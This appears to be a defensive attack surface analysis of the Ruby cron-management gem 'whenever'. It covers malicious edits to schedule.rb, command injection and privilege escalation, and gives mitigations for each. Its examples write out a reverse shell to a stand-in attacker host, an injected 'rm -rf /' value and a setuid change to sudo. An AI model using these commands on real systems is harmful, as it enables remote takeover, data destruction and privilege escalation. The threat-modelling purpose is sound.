# Attack Surface Analysis for javan/whenever

## Attack Surface: [Malicious `schedule.rb` Modification](./attack_surfaces/malicious__schedule_rb__modification.md)

**Description:** Unauthorized write access to the `schedule.rb` file allows attackers to define arbitrary cron jobs.

**How Whenever Contributes:** `whenever` uses `schedule.rb` as its configuration file. Modifying it directly dictates the commands `whenever` will manage and the cron daemon will execute.

**Example:** An attacker modifies `schedule.rb` to include `every 1.day, at: 'midnight' do command "bash -i >& /dev/tcp/attacker.example.com/4444 0>&1"` to establish a reverse shell.

**Impact:** Full control over the server through arbitrary command execution with the privileges of the user running the cron jobs.

**Risk Severity:** Critical

**Mitigation Strategies:**
* Implement strict file system permissions on `schedule.rb`, allowing only authorized users and processes to modify it.
* Utilize version control for `schedule.rb` to track changes and enable rollback.
* Employ code review processes for any modifications to `schedule.rb`.
* Consider storing `schedule.rb` in a read-only location and using a controlled deployment process for updates.

## Attack Surface: [Command Injection via Dynamic Configuration](./attack_surfaces/command_injection_via_dynamic_configuration.md)

**Description:** The application dynamically generates parts of the scheduled commands within `schedule.rb` based on external data without proper sanitization.

**How Whenever Contributes:** `whenever` executes the commands as defined in `schedule.rb`. If these commands are constructed using unsanitized dynamic data, it creates a direct command injection vulnerability within the context of `whenever`-managed cron jobs.

**Example:**  `schedule.rb` contains `every 1.day do command "backup_script #{ENV['BACKUP_LOCATION']}"` and the `BACKUP_LOCATION` environment variable is sourced from user input without sanitization, allowing an attacker to set `BACKUP_LOCATION` to `; rm -rf /`.

**Impact:** Arbitrary command execution on the server with the privileges of the user running the cron jobs.

**Risk Severity:** Critical

**Mitigation Strategies:**
* Avoid dynamically generating command parts within `schedule.rb` based on untrusted input.
* If dynamic command generation is absolutely necessary, implement rigorous input validation and sanitization.
* Consider using parameterized commands or safer alternatives to string interpolation within `schedule.rb` if the underlying functionality supports it.

## Attack Surface: [Cron Job Manipulation and Privilege Escalation](./attack_surfaces/cron_job_manipulation_and_privilege_escalation.md)

**Description:** Attackers exploit `whenever`'s interaction with the system's crontab to execute commands with elevated privileges.

**How Whenever Contributes:** The `whenever --update-crontab` command is the primary mechanism for `whenever` to manage cron entries. If this command is run with elevated privileges (e.g., root), vulnerabilities in how `whenever` handles `schedule.rb` or its execution can lead to privilege escalation.

**Example:** If `whenever --update-crontab` is executed via `sudo`, and an attacker can influence the content of `schedule.rb`, they could add a job like `every 1.minute do runner "system('chmod +s /usr/bin/sudo')"` to grant setuid privileges to the `sudo` command.

**Impact:** Privilege escalation, allowing an attacker with lower privileges to execute commands as a more privileged user (e.g., root).

**Risk Severity:** High

**Mitigation Strategies:**
* Avoid running `whenever --update-crontab` with unnecessary elevated privileges. Run it as the specific user that owns the cron jobs.
* Implement strict access controls on the user account used to run `whenever` commands.
* Carefully review and restrict the parameters and content of `schedule.rb`.
* Consider alternative methods for managing cron jobs that offer more granular control and security if the risk is deemed too high.

